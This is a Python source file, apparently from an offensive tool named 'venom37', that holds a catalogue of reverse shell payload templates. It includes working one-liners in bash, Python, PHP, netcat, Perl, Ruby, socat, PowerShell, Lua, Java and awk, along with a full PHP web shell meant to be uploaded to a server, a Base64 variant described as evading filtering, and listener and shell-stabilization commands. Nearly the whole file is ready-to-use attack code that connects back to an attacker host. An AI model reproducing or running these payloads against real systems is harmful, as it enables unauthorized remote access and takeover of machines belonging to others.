"""Reverse shell payload templates for venom37."""
from __future__ import annotations

SHELLS: dict[str, dict] = {
    "bash": {
        "name": "Bash TCP",
        "template": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "description": "Bash built-in TCP reverse shell. Works on most Linux systems with /dev/tcp support.",
        "platform": "linux",
        "requires": "bash with /dev/tcp (most distros)",
        "variants": {
            "bash-196": "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "bash-udp": "sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
            "bash-exec": "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
        },
    },
    "python": {
        "name": "Python",
        "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python reverse shell using socket + subprocess. Works with Python 2 or 3.",
        "platform": "linux/mac",
        "requires": "python3 (or python)",
    },
    "python2": {
        "name": "Python 2",
        "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python 2 reverse shell.",
        "platform": "linux/mac",
        "requires": "python (Python 2)",
    },
    "php": {
        "name": "PHP",
        "template": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell using fsockopen. Good for web servers running PHP.",
        "platform": "linux",
        "requires": "php-cli",
        "variants": {
            "php-exec": "php -r '$sock=fsockopen(\"{lhost}\",{lport});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        },
    },
    "php-web": {
        "name": "PHP Web Shell (pentestmonkey)",
        "template": """<?php
set_time_limit(0);
$ip = '{lhost}';
$port = {lport};
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{ exit(1); }}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {{ exit(1); }}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {{
    if (feof($sock)) {{ break; }}
    if (feof($pipes[1])) {{ break; }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a = null, $error_a = null, null);

    if (in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>""",
        "description": "Full PHP reverse shell (pentestmonkey-style). Upload this as a .php file on the web server.",
        "platform": "linux",
        "requires": "PHP on web server",
    },
    "nc": {
        "name": "Netcat",
        "template": "nc -e /bin/sh {lhost} {lport}",
        "description": "Netcat reverse shell with -e flag. Only works with traditional netcat (not ncat/OpenBSD nc).",
        "platform": "linux",
        "requires": "netcat-traditional (with -e)",
        "variants": {
            "nc-pipe": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "nc-ncat": "ncat {lhost} {lport} -e /bin/sh",
        },
    },
    "nc-mkfifo": {
        "name": "Netcat mkfifo",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "description": "Netcat reverse shell using mkfifo pipe. Works with ANY version of netcat (including OpenBSD nc).",
        "platform": "linux",
        "requires": "any netcat + mkfifo",
    },
    "perl": {
        "name": "Perl",
        "template": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "description": "Perl reverse shell using Socket module. Available on most Unix systems.",
        "platform": "linux/mac",
        "requires": "perl",
    },
    "ruby": {
        "name": "Ruby",
        "template": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "description": "Ruby reverse shell using TCPSocket.",
        "platform": "linux/mac",
        "requires": "ruby",
    },
    "socat": {
        "name": "Socat",
        "template": "socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "description": "Socat reverse shell with a proper PTY. Best shell quality — supports tab completion, Ctrl+C, etc.",
        "platform": "linux",
        "requires": "socat",
    },
    "powershell": {
        "name": "PowerShell",
        "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "description": "PowerShell reverse shell. Works on Windows and PowerShell Core on Linux.",
        "platform": "windows/linux",
        "requires": "powershell",
    },
    "powershell-base64": {
        "name": "PowerShell Base64",
        "template": "$GENERATE_PS_B64",  # Special: generated at runtime
        "description": "PowerShell reverse shell encoded in Base64 to bypass basic filtering.",
        "platform": "windows",
        "requires": "powershell",
    },
    "lua": {
        "name": "Lua",
        "template": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "description": "Lua reverse shell using luasocket.",
        "platform": "linux",
        "requires": "lua + luasocket",
    },
    "java": {
        "name": "Java",
        "template": "Runtime r = Runtime.getRuntime(); String[] cmd = {{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}}; Process p = r.exec(cmd);",
        "description": "Java Runtime.exec() reverse shell. Useful for Java web app exploitation.",
        "platform": "linux",
        "requires": "java",
    },
    "xterm": {
        "name": "Xterm",
        "template": "xterm -display {lhost}:1",
        "description": "Xterm reverse shell. Requires X server on attacker (Xnest :1). Rarely used but good to know.",
        "platform": "linux",
        "requires": "xterm + X server on attacker",
    },
    "awk": {
        "name": "AWK",
        "template": "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'",
        "description": "AWK reverse shell using /inet/tcp. Works with gawk.",
        "platform": "linux",
        "requires": "gawk",
    },
}

LISTENERS: dict[str, str] = {
    "nc": "nc -lvnp {lport}",
    "socat": "socat file:`tty`,raw,echo=0 TCP-L:{lport}",
    "pwncat": "pwncat-cs -lp {lport}",
    "rlwrap": "rlwrap nc -lvnp {lport}",
    "msfconsole": "msfconsole -q -x 'use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'",
}

STABILIZE_COMMANDS = [
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "export TERM=xterm",
    "# Then press Ctrl+Z, and run: stty raw -echo; fg",
]
